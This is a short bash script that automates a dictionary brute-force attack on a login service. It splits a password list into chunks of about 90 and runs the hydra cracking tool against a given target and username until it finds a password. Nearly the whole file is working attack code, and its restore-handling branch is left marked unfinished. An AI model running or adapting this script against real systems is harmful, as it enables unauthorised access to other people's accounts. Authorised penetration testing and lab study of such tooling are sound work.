#!/bin/bash
# $1 is the target
# $2 is the dictionary
# $3 option for the username
# $4 is the username
# $5 type of attack
red="\033[1;31m"
green="\033[1;32m"
transparent="\e[0m"

lines=$(wc -l $2 | cut -d " " -f 1)
echo $lines
begin=0
path=$(dirname $2)
n=$(($lines/90))
n=$((n+1))
for i in `seq $begin $n`;
do
if [ ! -e "./hydra.restore" ]; then 
	echo "nope"
else
	echo "press y to continu the last bruteforce attack"
	echo "press n to start a new  bruteforce attack"
	read ans 
	# need to be completed
	rm ./hydra.restore
fi

./tools/src/cutter.sh $2 $i $(($i+1)) $path/tmp_dico
echo "hydra -vV $3 $4 -P $path/tmp_dico$i -e s -F -o result/scanNetwork/tmp $1 " $5" "
hydra -vV $3 $4 -P $path/tmp_dico$i -e s -F -o result/scanNetwork/tmp $1 $5 
rm $path/tmp_dico$i
#if hydra found a password
state=($(tail -n 1 result/scanNetwork/tmp))
if [ ${state[0]} = "#" ]; then
	echo -e $red"We have finished to test $(($i*90)) passwords"
	echo -e "\t\t but"
	echo -e "We actually didn't find a correct password"$transparent
else
	echo $state
	echo "It's done :"
	rm $path/tmp_dico*
	break
fi
if [ ! -e "./hydra.restore" ]; then
	echo "load your dictionnary"
else
	exit
fi 


done
